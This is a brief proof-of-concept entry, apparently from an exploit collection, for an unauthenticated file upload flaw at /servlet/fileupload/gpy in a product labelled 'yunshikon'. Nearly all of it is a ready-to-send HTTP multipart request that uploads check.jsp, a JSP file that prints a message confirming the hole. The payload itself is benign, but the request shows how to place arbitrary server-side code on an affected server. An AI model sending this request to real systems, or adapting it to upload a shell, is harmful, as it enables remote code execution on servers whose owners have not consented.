# yunshikon_gpy_fileupload

from : https://mp.weixin.qq.com/s/WolT05Lc8Lx27SIxpEVwow

```
POST /servlet/fileupload/gpy HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 238

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="check.jsp"
Content-Type: application/octet-stream

<% out.println("This website has a vulnerability"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```
